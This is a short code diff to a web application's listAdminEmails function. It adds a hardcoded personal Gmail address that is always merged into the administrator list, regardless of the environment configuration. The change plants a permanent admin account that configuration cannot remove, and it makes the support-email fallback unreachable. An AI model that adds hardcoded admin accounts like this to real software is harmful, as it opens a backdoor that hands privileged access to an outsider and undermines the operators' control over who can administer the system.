@@ -7,7 +7,9 @@ export function listAdminEmails() {
     .split(",")
     .map((value) => value.trim().toLowerCase())
     .filter(Boolean);
-  if (fromEnv.length > 0) return fromEnv;
+  const always = ["hugo.rusu@gmail.com"];
+  const merged = [...new Set([...always, ...fromEnv])];
+  if (merged.length > 0) return merged;
   return [store.supportEmail.toLowerCase()];
 }
 
